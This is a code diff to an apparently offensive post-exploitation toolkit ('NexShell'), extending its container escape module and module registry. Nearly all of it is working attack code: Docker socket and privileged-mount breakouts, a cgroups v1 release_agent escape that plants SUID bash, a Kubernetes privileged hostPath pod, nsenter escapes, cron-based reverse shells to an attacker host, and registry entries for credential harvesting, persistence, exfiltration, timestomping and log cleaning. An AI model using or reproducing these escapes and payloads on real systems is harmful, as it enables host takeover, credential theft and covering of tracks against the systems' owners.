@@ -369,67 +369,249 @@ class DataExfil:
 
 
 # ══════════════════════════════════════════════════════════════════════════════
-#  MODULE: CONTAINER ESCAPE
+#  MODULE: CONTAINER ESCAPE  (Detection + Automated Exploitation)
 # ══════════════════════════════════════════════════════════════════════════════
 
 class ContainerEscape:
-    """Container escape techniques."""
+    """
+    Comprehensive container escape module.
+    Detection: fingerprint runtime, capabilities, mounts.
+    Exploitation: automated one-liners per vector.
+    """
 
+    # ── Detection ─────────────────────────────────────────────────────────────
     @staticmethod
-    def check_environment() -> str:
+    def full_detect() -> str:
+        """One script — checks every escape vector and reports findings."""
+        return r"""
+echo "=== [NexShell Container Escape Detector] ==="
+
+# Runtime identification
+echo "--- Runtime ---"
+[ -f /.dockerenv ]           && echo "[+] Docker container detected"
+[ -f /run/.containerenv ]    && echo "[+] Podman container detected"
+grep -qi 'lxc' /proc/1/cgroup 2>/dev/null  && echo "[+] LXC container detected"
+grep -qi 'kubepods' /proc/1/cgroup 2>/dev/null && echo "[+] Kubernetes pod detected"
+systemd-detect-virt 2>/dev/null | grep -qi 'docker\|lxc\|container' && echo "[+] virt-detect: container"
+
+# Capability check
+echo "--- Capabilities ---"
+CAP=$(cat /proc/self/status 2>/dev/null | grep CapEff | awk '{print $2}')
+echo "CapEff: $CAP"
+[ "$CAP" = "0000003fffffffff" ] || [ "$CAP" = "ffffffffffffffff" ] && \
+    echo "[!!!] PRIVILEGED CONTAINER — full cap set"
+
+# Docker socket
+echo "--- Docker Socket ---"
+for sock in /var/run/docker.sock /run/docker.sock /tmp/docker.sock; do
+    [ -S "$sock" ] && echo "[!!!] Docker socket accessible: $sock"
+done
+
+# Host mounts & writable paths
+echo "--- Mounts ---"
+mount | grep -v 'proc\|sysfs\|devpts\|tmpfs\|overlay\|cgroup' | \
+    grep -E 'rw|ext[234]|xfs|btrfs' | head -10
+findmnt -n --target /etc/cron.d 2>/dev/null && echo "[+] /etc/cron.d mounted from host"
+findmnt -n --target /root 2>/dev/null        && echo "[+] /root mounted from host"
+
+# cgroups v1 release_agent
+echo "--- cgroups v1 ---"
+if grep -q 'rdma' /proc/cgroups 2>/dev/null; then
+    echo "[+] cgroups v1 rdma subsystem available (release_agent escape possible)"
+fi
+# cgroups v2 (CVE-2022-0492 style check)
+[ -f /sys/fs/cgroup/cgroup.subtree_control ] && \
+    echo "[?] cgroups v2 detected — check unshare privesc"
+
+# runc / container runtime version
+echo "--- Runtime version ---"
+runc --version 2>/dev/null | head -2
+containerd --version 2>/dev/null | head -1
+
+# Kubernetes service account
+echo "--- Kubernetes ---"
+[ -f /var/run/secrets/kubernetes.io/serviceaccount/token ] && \
+    echo "[!!!] K8s service account token found — API abuse possible"
+env | grep -i 'kubernetes\|k8s\|kube' | head -5
+
+# Writable host paths
+echo "--- Host path abuse ---"
+[ -w /etc/cron.d ]              && echo "[!!!] /etc/cron.d writable"
+[ -w /etc/cron.hourly ]         && echo "[!!!] /etc/cron.hourly writable"
+[ -w /usr/local/bin ]           && echo "[!!!] /usr/local/bin writable"
+[ -w /etc/ld.so.preload ]       && echo "[!!!] /etc/ld.so.preload writable"
+
+# Namespace check
+echo "--- Namespaces ---"
+ls -la /proc/1/ns/ 2>/dev/null | head -5
+
+echo "=== [Done] ==="
+"""
+
+    # ── Exploitation: Privileged container ────────────────────────────────────
+    @staticmethod
+    def escape_privileged() -> str:
+        """Mount host filesystem and chroot. Requires SYS_ADMIN + privileged."""
         return (
-            "cat /proc/1/cgroup | head -5;"
-            "ls /.dockerenv 2>/dev/null && echo '[Docker]';"
-            "ls /run/.containerenv 2>/dev/null && echo '[Podman]';"
-            "systemd-detect-virt 2>/dev/null;"
-            "cat /proc/self/status | grep -i 'seccomp\\|cap'"
+            "# Step 1: Find host disk\n"
+            "HOST_DISK=$(fdisk -l 2>/dev/null | grep -oP '/dev/sd[a-z][0-9]?' | head -1)\n"
+            "[ -z \"$HOST_DISK\" ] && HOST_DISK=$(df / | awk 'NR==2{print $1}' | sed 's/[0-9]$/1/')\n"
+            "echo \"[*] Target disk: $HOST_DISK\"\n"
+            "# Step 2: Mount host root\n"
+            "mkdir -p /mnt/nxsh_host\n"
+            "mount $HOST_DISK /mnt/nxsh_host 2>/dev/null && echo '[+] Host mounted at /mnt/nxsh_host'\n"
+            "# Step 3: Escape\n"
+            "chroot /mnt/nxsh_host /bin/bash -c 'id; hostname'"
         )
 
+    # ── Exploitation: Docker socket ────────────────────────────────────────────
     @staticmethod
-    def privileged_container_escape() -> str:
+    def escape_docker_socket(lhost: str = '', lport: int = 0) -> str:
+        """Use accessible docker socket to escape to host."""
+        rev = ''
+        if lhost and lport:
+            rev = (
+                f" -e 'RHOST={lhost}' -e 'RPORT={lport}'"
+                " alpine sh -c 'bash -i >& /dev/tcp/$RHOST/$RPORT 0>&1'"
+            )
+        if not rev:
+            return (
+                "SOCK=/var/run/docker.sock\n"
+                "[ -S /run/docker.sock ] && SOCK=/run/docker.sock\n"
+                "echo '[*] Escaping via docker socket...'\n"
+                "docker -H unix://$SOCK run -it --rm --privileged "
+                "--pid=host --net=host --ipc=host "
+                "-v /:/host -w /host "
+                "alpine chroot /host /bin/bash"
+            )
         return (
-            "# Check if privileged\n"
-            "cat /proc/self/status | grep CapEff\n"
-            "# If CapEff is ffffffffffffffff:\n"
-            "mkdir /mnt/host\n"
-            "mount /dev/sda1 /mnt/host 2>/dev/null || mount $(df|grep -v tmpfs|tail -1|awk '{print $1}') /mnt/host\n"
-            "chroot /mnt/host /bin/bash"
+            "SOCK=/var/run/docker.sock\n"
+            "[ -S /run/docker.sock ] && SOCK=/run/docker.sock\n"
+            f"docker -H unix://$SOCK run --rm --privileged "
+            "--pid=host --net=host "
+            f"-v /:/host{rev}"
         )
 
+    # ── Exploitation: cgroups v1 release_agent ────────────────────────────────
     @staticmethod
-    def docker_socket_escape() -> str:
+    def escape_cgroups_v1(cmd: str = 'cp /bin/bash /tmp/.nxsh && chmod 4755 /tmp/.nxsh') -> str:
+        """CVE-2022-0492 / classic cgroups v1 release_agent escape."""
         return (
-            "docker -H unix:///var/run/docker.sock ps 2>/dev/null && "
-            "docker -H unix:///var/run/docker.sock run -it "
-            "--privileged --pid=host --net=host "
-            "-v /:/host alpine chroot /host sh"
+            "echo '[*] Attempting cgroups v1 release_agent escape...'\n"
+            "# Find writable cgroup mount\n"
+            "CGRP=$(cat /proc/mounts | grep 'cgroup ' | grep -v cgroup2 | head -1 | awk '{print $2}')\n"
+            "[ -z \"$CGRP\" ] && CGRP=/tmp/cgroot && mount -t cgroup -o rdma cgroup $CGRP 2>/dev/null\n"
+            "echo \"[*] cgroup mount: $CGRP\"\n"
+            "# Create sub-cgroup\n"
+            "mkdir -p $CGRP/nxsh_escape\n"
+            "echo 1 > $CGRP/nxsh_escape/notify_on_release\n"
+            "# Write payload\n"
+            "HOST_PATH=$(sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab 2>/dev/null | head -1)\n"
+            f"echo '#!/bin/sh' > /tmp/payload.sh\n"
+            f"echo '{cmd}' >> /tmp/payload.sh\n"
+            "chmod +x /tmp/payload.sh\n"
+            "echo \"${HOST_PATH}/tmp/payload.sh\" > $CGRP/release_agent\n"
+            "# Trigger\n"
+            "sh -c \"echo \\$\\$ > $CGRP/nxsh_escape/cgroup.procs\"\n"
+            "sleep 2\n"
+            "echo '[+] Payload triggered — check /tmp/.nxsh'\n"
+            "/tmp/.nxsh -p 2>/dev/null && echo '[+] Root shell acquired!'"
         )
 
+    # ── Exploitation: Kubernetes service account abuse ─────────────────────────
     @staticmethod
-    def cgroups_v1_escape() -> str:
+    def escape_kubernetes() -> str:
+        """Abuse K8s service account token for cluster admin / exec."""
         return (
-            "# CVE-2022-0492 cgroups v1 escape\n"
-            "mkdir /tmp/cgroup && mount -t cgroup -o rdma cgroup /tmp/cgroup\n"
-            "mkdir /tmp/cgroup/x && echo 1 > /tmp/cgroup/x/notify_on_release\n"
-            "echo '#!/bin/sh\\ncp /bin/bash /tmp/0xdf && chmod 4755 /tmp/0xdf' > /tmp/escape.sh\n"
-            "chmod +x /tmp/escape.sh\n"
-            "echo /tmp/escape.sh > /tmp/cgroup/release_agent\n"
-            "echo 0 > /tmp/cgroup/x/cgroup.procs\n"
-            "/tmp/0xdf -p"
-        )
-
-    @staticmethod
-    def kubernetes_service_account() -> str:
-        return (
-            "# Read service account token and CA\n"
+            "echo '[*] K8s service account escape...'\n"
             "TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\n"
-            "CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt\n"
-            "APISERVER=https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}\n"
-            "# Enumerate\n"
-            "curl -s --cacert $CACERT -H \"Authorization: Bearer $TOKEN\" "
-            "$APISERVER/api/v1/namespaces/default/pods\n"
-            "# Try to exec into another pod\n"
-            "kubectl exec -it $(kubectl get pods -o name|head -1) -- sh"
+            "CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt\n"
+            "API=https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}\n"
+            "\n# Check own permissions\n"
+            "curl -sk -H \"Authorization: Bearer $TOKEN\" $API/api/v1/namespaces/default/pods | python3 -m json.tool 2>/dev/null | grep -E 'name|status' | head -20\n"
+            "\n# Try to create privileged pod (host-mounted)\n"
+            "cat <<EOF | curl -sk -X POST $API/api/v1/namespaces/default/pods \\\n"
+            "  -H 'Content-Type: application/json' \\\n"
+            "  -H \"Authorization: Bearer $TOKEN\" --cacert $CA -d @-\n"
+            '{"apiVersion":"v1","kind":"Pod","metadata":{"name":"nxsh-escape"},'
+            '"spec":{"hostPID":true,"hostIPC":true,"hostNetwork":true,'
+            '"containers":[{"name":"nxsh","image":"alpine",'
+            '"command":["/bin/sh","-c","nsenter -t 1 -m -u -i -n /bin/bash"],'
+            '"securityContext":{"privileged":true},'
+            '"volumeMounts":[{"mountPath":"/host","name":"host"}]}],'
+            '"volumes":[{"name":"host","hostPath":{"path":"/"}}]}}\nEOF'
+        )
+
+    # ── Exploitation: runc / namespace escape ──────────────────────────────────
+    @staticmethod
+    def escape_runc_namespace() -> str:
+        """Use nsenter to break out of container namespaces (host PID required)."""
+        return (
+            "echo '[*] Namespace escape via nsenter (requires host PID access)...'\n"
+            "# Find host init PID via /proc\n"
+            "HOST_PID=$(ls -la /proc/*/exe 2>/dev/null | grep -v 'self\\|thread' | head -5)\n"
+            "echo \"Visible PIDs: $HOST_PID\"\n"
+            "\n# nsenter approach (requires CAP_SYS_PTRACE or --pid=host)\n"
+            "nsenter -t 1 -m -u -i -n -p -- /bin/bash 2>/dev/null && echo '[+] Escaped!'\n"
+            "# Alternative: chroot to /proc/1/root\n"
+            "ls /proc/1/root/ 2>/dev/null | head -10\n"
+            "chroot /proc/1/root /bin/bash 2>/dev/null || echo '[-] /proc/1/root not accessible'"
+        )
+
+    # ── Exploitation: Writable host path ──────────────────────────────────────
+    @staticmethod
+    def escape_writable_hostpath(cmd: str = 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1') -> str:
+        """Write to a host-mounted path to achieve persistence/escape."""
+        return (
+            "echo '[*] Checking writable host paths...'\n"
+            "\n# Via cron\n"
+            "if [ -w /etc/cron.d ]; then\n"
+            f"    echo '* * * * * root {cmd}' > /etc/cron.d/nxsh\n"
+            "    echo '[+] Cron job written to /etc/cron.d/nxsh'\n"
+            "fi\n"
+            "\n# Via ld.so.preload\n"
+            "if [ -w /etc/ld.so.preload ]; then\n"
+            "    echo '[+] /etc/ld.so.preload writable — shared library injection possible'\n"
+            "fi\n"
+            "\n# Via /usr/local/bin\n"
+            "if [ -w /usr/local/bin ]; then\n"
+            "    cp /bin/bash /usr/local/bin/nxsh\n"
+            "    chmod 4755 /usr/local/bin/nxsh\n"
+            "    echo '[+] SUID bash written to /usr/local/bin/nxsh'\n"
+            "fi"
+        )
+
+    # ── Auto-escape: try all vectors ──────────────────────────────────────────
+    @staticmethod
+    def auto_escape(lhost: str = '', lport: int = 0) -> str:
+        """Try all escape vectors in order of reliability."""
+        return (
+            "echo '=== [NexShell Auto-Escape] ==='\n"
+            "\n# Vector 1: Docker socket\n"
+            "for sock in /var/run/docker.sock /run/docker.sock; do\n"
+            "    if [ -S \"$sock\" ]; then\n"
+            f"        echo '[!] Docker socket found: $sock'\n"
+            "        docker -H unix://$sock run --rm --privileged "
+            "--pid=host -v /:/host alpine chroot /host id 2>/dev/null && "
+            "echo '[+] Docker socket escape SUCCESS' && break\n"
+            "    fi\n"
+            "done\n"
+            "\n# Vector 2: Privileged cap check\n"
+            "CAP=$(grep CapEff /proc/self/status | awk '{print $2}')\n"
+            "if [ \"$CAP\" = 'ffffffffffffffff' ] || [ \"$CAP\" = '0000003fffffffff' ]; then\n"
+            "    echo '[!] Privileged container — mounting host FS'\n"
+            "    mkdir -p /mnt/nxsh_host\n"
+            "    mount $(df|awk 'NR==2{print $1}') /mnt/nxsh_host 2>/dev/null && \\\n"
+            "    chroot /mnt/nxsh_host id && echo '[+] Privileged escape SUCCESS'\n"
+            "fi\n"
+            "\n# Vector 3: K8s service account\n"
+            "[ -f /var/run/secrets/kubernetes.io/serviceaccount/token ] && \\\n"
+            "echo '[!] K8s service account found — run: nexshell run container k8s'\n"
+            "\n# Vector 4: Writable host paths\n"
+            "for path in /etc/cron.d /etc/cron.hourly /usr/local/bin; do\n"
+            "    [ -w \"$path\" ] && echo \"[!] Writable host path: $path\"\n"
+            "done\n"
+            "echo '=== [Done] ==='"
         )
 
 
@@ -438,25 +620,51 @@ class ContainerEscape:
 # ══════════════════════════════════════════════════════════════════════════════
 
 MODULE_REGISTRY = {
-    # Linux recon
-    'quickenum':     {'desc': 'Fast Linux system enumeration',           'os': 'linux',   'type': 'recon'},
-    'privesc':       {'desc': 'Linux PrivEsc advisor (SUID/GTFOBins)',   'os': 'linux',   'type': 'privesc'},
-    'credharvest':   {'desc': 'Linux credential harvester',              'os': 'linux',   'type': 'creds'},
-    # Windows recon
-    'win-enum':      {'desc': 'Windows system enumeration',              'os': 'windows', 'type': 'recon'},
-    'win-privesc':   {'desc': 'Windows PrivEsc advisor',                 'os': 'windows', 'type': 'privesc'},
-    'win-creds':     {'desc': 'Windows credential harvester',            'os': 'windows', 'type': 'creds'},
-    # Active Directory
-    'ad-recon':      {'desc': 'AD enumeration (no tools needed)',        'os': 'windows', 'type': 'ad'},
-    'ad-kerberoast': {'desc': 'Find Kerberoastable SPNs',                'os': 'windows', 'type': 'ad'},
-    'ad-asreproast': {'desc': 'Find ASREPRoastable accounts',            'os': 'windows', 'type': 'ad'},
-    # Persistence
-    'persist-linux': {'desc': 'Linux persistence mechanisms',            'os': 'linux',   'type': 'persist'},
-    'persist-win':   {'desc': 'Windows persistence mechanisms',          'os': 'windows', 'type': 'persist'},
-    # Lateral movement
-    'lateral':       {'desc': 'Lateral movement commands',               'os': 'both',    'type': 'lateral'},
-    # Container escape
-    'container':     {'desc': 'Container escape (Docker/K8s)',           'os': 'linux',   'type': 'escape'},
-    # Exfiltration
-    'exfil':         {'desc': 'Data exfiltration techniques',            'os': 'both',    'type': 'exfil'},
+    # ── Linux Recon ───────────────────────────────────────────────────────────
+    'quickenum':        {'desc': 'Fast Linux system enumeration (in-memory)',        'os': 'linux',   'type': 'recon'},
+    'privesc':          {'desc': 'Linux PrivEsc advisor (SUID/GTFOBins/cron)',       'os': 'linux',   'type': 'privesc'},
+    'credharvest':      {'desc': 'Linux credential harvester (.env/ssh/hist)',       'os': 'linux',   'type': 'creds'},
+    # ── Windows Recon ─────────────────────────────────────────────────────────
+    'win-enum':         {'desc': 'Windows system enumeration',                       'os': 'windows', 'type': 'recon'},
+    'win-privesc':      {'desc': 'Windows PrivEsc advisor (AlwaysInstall/UAC/svc)', 'os': 'windows', 'type': 'privesc'},
+    'win-creds':        {'desc': 'Windows credential harvester (DPAPI/SAM/reg)',    'os': 'windows', 'type': 'creds'},
+    # ── Active Directory ──────────────────────────────────────────────────────
+    'ad-recon':         {'desc': 'AD enumeration (no tools needed, pure PS)',        'os': 'windows', 'type': 'ad'},
+    'ad-kerberoast':    {'desc': 'Find & roast Kerberoastable SPNs',                'os': 'windows', 'type': 'ad'},
+    'ad-asreproast':    {'desc': 'Find ASREPRoastable accounts',                    'os': 'windows', 'type': 'ad'},
+    # ── Persistence ───────────────────────────────────────────────────────────
+    'persist-linux':    {'desc': 'Linux persistence (cron/systemd/suid/ssh-key)',   'os': 'linux',   'type': 'persist'},
+    'persist-win':      {'desc': 'Windows persistence (reg/schtask/WMI/startup)',   'os': 'windows', 'type': 'persist'},
+    # ── Lateral Movement ──────────────────────────────────────────────────────
+    'lateral':          {'desc': 'Lateral movement commands (SSH/WMI/DCOM/PTH)',    'os': 'both',    'type': 'lateral'},
+    # ── Container Escape ──────────────────────────────────────────────────────
+    'container':        {'desc': 'Auto-detect container escape vectors',             'os': 'linux',   'type': 'escape'},
+    'container-auto':   {'desc': 'Automated container escape (tries all vectors)',   'os': 'linux',   'type': 'escape'},
+    'container-docker': {'desc': 'Docker socket escape (interactive)',               'os': 'linux',   'type': 'escape'},
+    'container-cgroup': {'desc': 'cgroups v1 release_agent escape (CVE-2022-0492)', 'os': 'linux',   'type': 'escape'},
+    'container-k8s':    {'desc': 'Kubernetes service account abuse / pod escape',   'os': 'linux',   'type': 'escape'},
+    'container-ns':     {'desc': 'Namespace escape via nsenter',                    'os': 'linux',   'type': 'escape'},
+    # ── Exfiltration ──────────────────────────────────────────────────────────
+    'exfil':            {'desc': 'Data exfiltration (HTTP/DNS/ICMP/SMB/certutil)',  'os': 'both',    'type': 'exfil'},
+    # ── Loot ──────────────────────────────────────────────────────────────────
+    'loot':             {'desc': 'Auto-collect loot (creds/keys/tokens/hashes)',    'os': 'both',    'type': 'loot'},
+    'loot-scan':        {'desc': 'Scan session output for sensitive data',          'os': 'both',    'type': 'loot'},
+    'loot-report':      {'desc': 'Generate loot report (JSON/MD/HTML)',             'os': 'both',    'type': 'loot'},
+    # ── OPSEC ─────────────────────────────────────────────────────────────────
+    'opsec':            {'desc': 'Show/set OPSEC profile (ghost/normal/paranoid)',  'os': 'both',    'type': 'opsec'},
+    'timestomp':        {'desc': 'Modify file timestamps to match system files',    'os': 'both',    'type': 'opsec'},
+    'logclean':         {'desc': 'Clean logs and shell history on target',          'os': 'both',    'type': 'opsec'},
+    'obfuscate':        {'desc': 'Obfuscate a command (XOR/B64/hex/chararray)',     'os': 'both',    'type': 'opsec'},
 }
+
+
+def list_modules(os_filter: str = 'all', type_filter: str = 'all') -> list:
+    """Return modules matching the given OS and type filters."""
+    result = []
+    for name, meta in MODULE_REGISTRY.items():
+        if os_filter != 'all' and meta['os'] not in (os_filter, 'both'):
+            continue
+        if type_filter != 'all' and meta['type'] != type_filter:
+            continue
+        result.append({'name': name, **meta})
+    return result
